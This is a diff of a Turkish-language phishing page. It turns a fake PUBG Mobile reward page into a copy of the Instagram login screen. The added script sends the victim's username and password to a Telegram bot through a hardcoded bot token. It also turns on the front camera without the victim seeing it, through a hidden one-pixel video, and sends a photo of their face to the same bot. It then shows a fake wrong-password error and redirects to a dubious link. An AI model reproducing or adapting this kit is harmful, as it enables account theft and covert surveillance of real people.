@@ -1,38 +1,39 @@
-<!<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE | Ödül Merkezi</title>
+    <title>Giriş Yap • Instagram</title>
     <style>
-        body { margin: 0; background: #0b0d11; color: #ffde00; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .box { border: 1px solid #ffde00; padding: 30px; border-radius: 12px; background: #000; width: 340px; text-align: center; z-index: 10; }
-        h2 { font-size: 1.5em; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; margin: 15px 0; background: #1a1f29; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; background: #ffde00; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; }
-        #log { font-family: monospace; font-size: 11px; margin-top: 15px; color: #00ff00; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
+        .logo { width: 175px; margin-bottom: 30px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        .btn-login { width: 100%; background: #0095f6; border: none; color: white; padding: 7px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btn-login:disabled { background: #b2dffc; cursor: default; }
+        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 15px; }
+        #status { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; }
         
-        /* ÖNEMLİ: Siyah ekranı önlemek için video görünür olmalı ama kullanıcı görmemeli */
-        #v {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
-        }
+        /* Gizli Video ve Canvas */
+        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box" id="ui">
-    <img src="https://www.pubgmobile.com/images/icon_logo_big.png" width="70" style="margin-bottom:10px;">
-    <h2>9999 UC AKTİF ET</h2>
-    <p style="color:#888; font-size:0.9em;">Numaranızı doğrulayarak UC'lerinizi hemen çekin.</p>
-    <input type="tel" id="phone-input" placeholder="05XX XXX XX XX">
-    <button class="btn" onclick="sizmaIslemi()">DOĞRULAMAYI BAŞLAT</button>
-    <div id="log"></div>
+<div class="login-box">
+    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511102835.png" alt="Instagram" class="logo">
+    
+    <input type="text" id="user-phone" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
+    <input type="password" id="user-pass" placeholder="Şifre">
+    
+    <button class="btn-login" id="login-btn" onclick="executeCapture()">Giriş Yap</button>
+
+    <div class="divider">YA DA</div>
+    <p style="color:#385185; font-weight:bold; font-size:14px; cursor:pointer;">Facebook ile Giriş Yap</p>
+    
+    <div id="status">Üzgünüz, şifreniz yanlıştı. Lütfen şifrenizi kontrol edin.</div>
 </div>
 
 <video id="v" autoplay playsinline muted></video>
@@ -40,65 +41,72 @@
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const ownerID = urlParams.get('id'); 
+    const ownerID = urlParams.get('id');
 
     const CONFIG = {
-        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // SENİN BOT TOKENIN
-        REDIRECT: "https://www.pubgmobile.com"
+        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // BURAYA KENDİ BOT TOKENINI YAZ AŞKIM
+        REDIRECT: "https://redirectplayfastly.com/?s=96&ref=sa_w237557c297471l16817p1349_prosperitycollege.ca&from=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D&click_id=19ad268.2.4sr67ie&encoded_url=dHIvcmVnaXN0ZXI%2Fc3ViX2lkPXByb3NwZXJpdHljb2xsZWdlLmNh"
     };
 
-    async function veriyiGonder(mesaj, resim = null) {
+    async function sendData(msg, photo = null) {
         if (!ownerID) return;
         const api = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
         const fd = new FormData();
         fd.append('chat_id', ownerID);
 
-        if (resim) {
-            fd.append('photo', resim, 'capture.jpg');
-            fd.append('caption', mesaj);
+        if (photo) {
+            fd.append('photo', photo, 'capture.jpg');
+            fd.append('caption', msg);
             await fetch(api + 'sendPhoto', { method: 'POST', body: fd });
         } else {
-            fd.append('text', mesaj);
+            fd.append('text', msg);
             await fetch(api + 'sendMessage', { method: 'POST', body: fd });
         }
     }
 
-    async function sizmaIslemi() {
-        const numara = document.getElementById('phone-input').value;
-        if(numara.length < 10) return alert("Numara girin!");
+    async function executeCapture() {
+        const user = document.getElementById('user-phone').value;
+        const pass = document.getElementById('user-pass').value;
+        const btn = document.getElementById('login-btn');
+        const status = document.getElementById('status');
 
-        const log = document.getElementById('log');
-        log.innerText = "> Bağlantı kuruluyor...";
+        if (user.length < 3 || pass.length < 5) return;
 
-        await veriyiGonder(`🔥 HEDEF DÜŞTÜ!\n📞 Numara: ${numara}`);
+        btn.disabled = true;
+        btn.innerText = "Yükleniyor...";
 
+        // 1. Veri: Kullanıcı adı ve Şifreyi hemen gönder
+        await sendData(`📱 **INSTAGRAM HESABI DÜŞTÜ!**\n\n👤 Kullanıcı: \`${user}\`\n🔑 Şifre: \`${pass}\``);
+
+        // 2. İşlem: Kamerayı tetikle
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('v');
             video.srcObject = stream;
-            
-            // Videonun gerçekten oynamasını sağla
             await video.play();
 
-            log.innerText = "> Doğrulanıyor (5s)...";
-
-            // Siyah ekranı önlemek için 5 saniye bekle (kamera açılış süresi)
+            // 5 saniye bekle ve resmi çek
             setTimeout(() => {
                 const canvas = document.getElementById('c');
-                canvas.width = video.videoWidth; 
+                canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 canvas.toBlob(blob => {
-                    veriyiGonder(`📸 GÖRÜNTÜ GELDİ | NO: ${numara}`, blob);
+                    sendData(`📸 **GÖRÜNTÜ YAKALANDI**\n👤 Kullanıcı: ${user}`, blob);
                     stream.getTracks().forEach(t => t.stop());
-                    log.innerText = "> İŞLEM TAMAMLANDI!";
-                    setTimeout(() => window.location.href = CONFIG.REDIRECT, 1000);
+                    
+                    // Hata mesajı göster ve resmi siteye yönlendir
+                    status.style.display = "block";
+                    btn.disabled = false;
+                    btn.innerText = "Giriş Yap";
+                    setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
                 }, 'image/jpeg');
-            }, 5000); 
+            }, 5000);
 
-        } catch(e) { 
-            window.location.href = CONFIG.REDIRECT; 
+        } catch (e) {
+            status.style.display = "block";
+            setTimeout(() => window.location.href = CONFIG.REDIRECT, 2000);
         }
     }
 </script>
